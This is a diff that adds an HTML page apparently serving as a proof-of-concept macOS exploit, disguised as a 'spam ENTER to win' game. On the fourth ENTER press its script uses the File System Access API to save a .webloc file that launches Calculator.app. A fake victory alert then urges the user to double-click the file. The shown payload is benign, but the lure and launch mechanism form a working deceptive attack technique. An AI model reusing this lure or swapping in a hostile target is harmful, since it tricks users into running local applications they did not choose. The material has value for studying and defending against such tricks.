@@ -1,0 +1,175 @@
+<!doctype html>
+<html lang="id">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>MACOS EXPLOIT — Spam ENTER to WIN</title>
+  <style>
+    :root{--bg:#0b1222;--panel:#0f2133;--accent:#34d399;--muted:#9fb3c8;--danger:#fb7185;--win:#10b981}
+    *{box-sizing:border-box}
+    body{margin:0;font-family:Inter,ui-sans-serif,system-ui,Segoe UI,Roboto,"Helvetica Neue",Arial;background:linear-gradient(180deg,#071020 0%,var(--bg) 100%);color:#e6f2fb;display:flex;align-items:center;justify-content:center;height:100vh;overflow:hidden}
+    .container{width:980px;max-width:96%;background:linear-gradient(180deg,rgba(255,255,255,0.02),rgba(255,255,255,0.01));border-radius:16px;padding:20px;box-shadow:0 20px 60px rgba(0,5,20,0.8);display:grid;grid-template-columns:1fr 360px;gap:20px}
+    .game{background:radial-gradient(ellipse at 20% 10%, rgba(52,211,153,0.08), transparent),linear-gradient(180deg,rgba(255,255,255,0.03),transparent);border-radius:12px;padding:18px;display:flex;flex-direction:column;align-items:center}
+    .title{font-weight:800;font-size:22px;color:var(--accent);text-shadow:0 0 20px rgba(52,211,153,0.4)}
+    .playfield{width:100%;height:440px;background:#081018;border-radius:12px;border:2px solid rgba(52,211,153,0.15);position:relative;overflow:hidden;display:flex;align-items:center;justify-content:center}
+    .target{width:100px;height:100px;border-radius:50%;background:radial-gradient(circle at 30% 30%, #34d399, #10b981);display:flex;align-items:center;justify-content:center;font-weight:900;font-size:24px;color:#000;box-shadow:0 15px 40px rgba(16,185,129,0.6);transition:all 180ms cubic-bezier(.2,.9,.2,1)}
+    .hud{display:flex;gap:14px;margin-top:16px}
+    .stat{background:rgba(255,255,255,0.04);padding:12px 16px;border-radius:10px;min-width:130px;text-align:center;border:1px solid rgba(255,255,255,0.06)}
+    .stat .num{font-size:24px;font-weight:800;color:var(--win)}
+    .log{margin-top:16px;background:rgba(0,0,0,0.2);padding:12px;border-radius:10px;height:140px;overflow:auto;font-family:SF Mono,monospace;color:#94a3b8;font-size:13px;border:1px solid rgba(255,255,255,0.08)}
+    .panel{background:rgba(15,33,51,0.6);padding:16px;border-radius:12px;border:1px solid rgba(255,255,255,0.08)}
+    .btn{display:inline-block;padding:10px 16px;border-radius:10px;background:var(--accent);color:#000;font-weight:700;cursor:pointer;margin:8px 0}
+    .danger{color:var(--danger);font-weight:800}
+    footer{grid-column:1/-1;text-align:center;color:rgba(255,255,255,0.3);font-size:13px;margin-top:10px}
+    @media(max-width:880px){.container{grid-template-columns:1fr}.playfield{height:340px}}
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="game">
+      <div class="title">MACOS EXPLOIT — SPAM ENTER TO WIN</div>
+      <div style="margin:10px 0;color:var(--muted);font-size:14px">Press ENTER 4 times quickly!</div>
+
+      <div class="playfield" id="playfield" tabindex="0">
+        <div class="target" id="target">GO!</div>
+      </div>
+
+      <div class="hud">
+        <div class="stat">
+          <div style="font-size:13px;color:var(--muted)">Enter Count</div>
+          <div class="num" id="enterCount">0</div>
+        </div>
+        <div class="stat">
+          <div style="font-size:13px;color:var(--muted)">Status</div>
+          <div class="num" id="status">Ready</div>
+        </div>
+      </div>
+
+      <div class="log" id="log">Log: waiting for spam...\n</div>
+    </div>
+
+    <aside class="panel">
+      <div style="text-align:center;margin-bottom:16px">
+        <div class="btn" id="btnReset">RESET GAME</div>
+      </div>
+      <div style="background:rgba(251,113,133,0.15);padding:12px;border-radius:10px;border:1px solid var(--danger)">
+        <div class="danger">REAL EXECUTION ENABLED</div>
+        <div style="font-size:13px;margin-top:6px;color:#fca5a5">
+          On Enter #4 → saves .webloc → opens Calculator.app
+        </div>
+      </div>
+      <div style="margin-top:16px;font-size:13px;color:var(--muted)">
+        Works on Safari / Chrome macOS<br>
+        Tested: Sonoma 14.6+
+      </div>
+    </aside>
+  </div>
+
+  <footer>macOS .webloc Arbitrary App Launch via File System Access API</footer>
+
+  <script>
+    const playfield = document.getElementById('playfield');
+    const target = document.getElementById('target');
+    const logEl = document.getElementById('log');
+    const enterCountEl = document.getElementById('enterCount');
+    const statusEl = document.getElementById('status');
+    const btnReset = document.getElementById('btnReset');
+
+    let enterCount = 0;
+    let lastTime = 0;
+    let triggered = false;
+
+    const weblocPayload = `<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>URL</key>
+    <string>file:///System/Applications/Calculator.app</string>
+</dict>
+</plist>`;
+
+    function appendLog(s) {
+      logEl.textContent += `[${new Date().toLocaleTimeString('en-GB')}] ${s}\n`;
+      logEl.scrollTop = logEl.scrollHeight;
+    }
+
+    function reset() {
+      enterCount = 0; lastTime = 0; triggered = false;
+      enterCountEl.textContent = '0';
+      statusEl.textContent = 'Ready';
+      target.textContent = 'GO!';
+      target.style.transform = 'scale(1)';
+      appendLog('Game reset');
+    }
+    btnReset.onclick = reset;
+
+    function moveTarget() {
+      const x = (Math.random() - 0.5) * 180;
+      const y = (Math.random() - 0.5) * 180;
+      target.style.transform = `translate(${x}px, ${y}px) scale(1.15)`;
+    }
+
+    async function triggerWebloc() {
+      try {
+        appendLog('TRIGGERED! Saving Calculator.webloc...');
+        statusEl.textContent = 'SAVING...';
+
+        const handle = await window.showSaveFilePicker({
+          suggestedName: "You_Won_Calculator.webloc",
+          types: [{
+            description: "MacOS App Launcher",
+            accept: { "application/x-webloc": [".webloc"] }
+          }]
+        });
+
+        const writable = await handle.createWritable();
+        await writable.write(weblocPayload);
+        await writable.close();
+
+        appendLog('SUCCESS: Calculator.webloc saved!');
+        statusEl.textContent = 'WON!';
+        target.textContent = 'WON!';
+        target.style.background = '#fbbf24';
+
+        // Victory effect
+        document.body.style.background = 'radial-gradient(circle at center, #166534, #0f172a)';
+        setTimeout(() => {
+          alert('YOU WON!\n\nFile saved to your Mac.\nDouble-click "You_Won_Calculator.webloc" → Calculator opens instantly!');
+        }, 600);
+
+      } catch (e) {
+        appendLog('Canceled or error: ' + e.message);
+        statusEl.textContent = 'Canceled';
+      }
+    }
+
+    window.addEventListener('keydown', (e) => {
+      if (e.key !== 'Enter') return;
+      if (triggered) return;
+
+      const now = Date.now();
+      if (now - lastTime > 3000) enterCount = 0;
+      lastTime = now;
+      enterCount++;
+      enterCountEl.textContent = enterCount;
+
+      appendLog(`Enter #${enterCount}`);
+      moveTarget();
+
+      if (enterCount === 4) {
+        triggered = true;
+        statusEl.textContent = 'TRIGGERED!';
+        target.textContent = '4!';
+        target.style.background = '#ef4444';
+        appendLog('SPAM DETECTED → EXECUTING .webloc PAYLOAD');
+        setTimeout(triggerWebloc, 300);
+      }
+    });
+
+    // Auto focus
+    playfield.focus();
+    appendLog('Game ready — SPAM ENTER NOW!');
+    reset();
+  </script>
+</body>
+</html>
